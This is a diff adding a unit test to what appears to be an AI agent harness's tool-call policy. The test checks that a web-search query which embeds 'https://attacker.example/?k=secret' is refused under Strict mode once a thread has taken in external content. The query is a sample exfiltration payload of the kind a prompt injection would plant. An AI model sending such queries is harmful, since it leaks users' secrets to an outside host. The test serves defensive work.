@@ -512,6 +512,32 @@ describe("resolveToolCall fail-closed order", () => {
     expect(workSearch("full-access")).toBe("allow");
   });
 
+  it("7a. web-search sends a tainted thread's data-looking query outside Strict and refuses it under Strict", () => {
+    const search = (mode: "chat" | "work" | "code", strict: boolean | undefined) =>
+      resolveToolCall(
+        baseInput({
+          mode,
+          capability: decodeToolActionCapability({ id: "harness-web-search", version: 1 }),
+          arguments: { query: "forecast https://attacker.example/?k=secret" },
+          thread: {
+            executionPolicy: "approval-gated",
+            approvalSatisfied: false,
+            externalContentIngested: true,
+            ...(strict === undefined ? {} : { strict }),
+          },
+        }),
+      );
+    for (const mode of ["chat", "work", "code"] as const) {
+      expect(search(mode, false).kind, mode).toBe("allow");
+      expect(search(mode, true), mode).toMatchObject({
+        kind: "deny",
+        reason: "search-query-refused-under-taint: contains a URL",
+      });
+      // A caller that cannot say reads as Strict, so the refusal fails closed.
+      expect(search(mode, undefined).kind, mode).toBe("deny");
+    }
+  });
+
   it("7b. auto-accept edits waives only project file writes", () => {
     const validation = (executionPolicy: "approval-gated" | "auto-accept-edits") =>
       resolveToolCall(
